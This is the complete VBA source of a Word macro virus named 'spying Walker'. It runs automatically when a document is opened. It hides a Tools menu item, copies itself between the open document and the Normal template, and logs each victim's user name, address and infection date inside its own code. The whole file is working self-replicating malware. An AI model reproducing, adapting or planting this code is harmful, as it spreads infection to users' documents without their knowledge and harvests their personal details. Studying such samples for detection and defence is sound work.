   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   Rem BEGINN MODIFIED TDIE

   End Sub

   Private Sub Document_New()

   End Sub

   Private Sub Document_Open()
   On Error Resume Next
   NormInstalled = False
   ActInstalled = False
   WrittenBy = Lord_Arz
   VirusName = "spying Walker"
   Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Application.CommandBars("Tools").Controls(12).Visible = False

   NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
   AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

   If UCase(NI) = "REM BEGINN MODIFIED TDIE" Then NormInstalled = True
   If UCase(AI) = "REM BEGINN MODIFIED TDIE" Then ActInstalled = True

   If NormInstalled = True And ActInstalled = True Then GoTo PayLoad

   If NormInstalled = False Then
       Set Infection = NormCarrier
       Set Carrier = ActCarrier
   Else
       Set Infection = ActCarrier
       Set Carrier = NormCarrier
   End If

   With Carrier
       VirCode = .Lines(1, .CountOfLines)
   End With
   With Infection
       .DeleteLines 1, .CountOfLines
       .InsertLines 1, VirCode
   End With
   PayLoad:
   ActPos = Application.UserName
   For x = 1 To NormCarrier.CountOfLines
       If NormCarrier.Lines(x, 1) = "'" & ActPos Then Exit Sub
       If NormCarrier.Lines(x, 1) = "'I were at:" Then InsPos = x
   Next x
   NormCarrier.InsertLines InsPos + 1, "'" & ActPos & Chr(13) & "'Address: " & Application.UserAddress & "    infected on: " & Date
   'I were at:
   End Sub
